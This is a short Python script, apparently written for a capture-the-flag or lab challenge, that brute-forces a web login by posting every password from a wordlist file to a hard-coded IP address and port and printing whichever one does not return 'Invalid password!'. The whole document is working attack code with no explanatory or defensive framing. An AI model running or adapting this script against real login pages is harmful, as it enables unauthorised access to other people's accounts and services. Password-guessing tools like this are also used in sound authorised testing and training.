from urllib.parse import urlencode
from urllib.request import Request, urlopen

url = 'http://88.198.233.174:33890' # Set destination URL here

# words.txt = a dictionary of passwords. 
filename = 'words.txt'
f = open(filename,'r')

content = f.readlines()
content = [x.strip() for x in content] 

for x in content:
	post_fields = {'password': x}
	request = Request(url, urlencode(post_fields).encode())
	json = urlopen(request).read().decode()
	if "Invalid password!" not in json:
		print(json)
		print(x)
		input("Press Enter to continue...")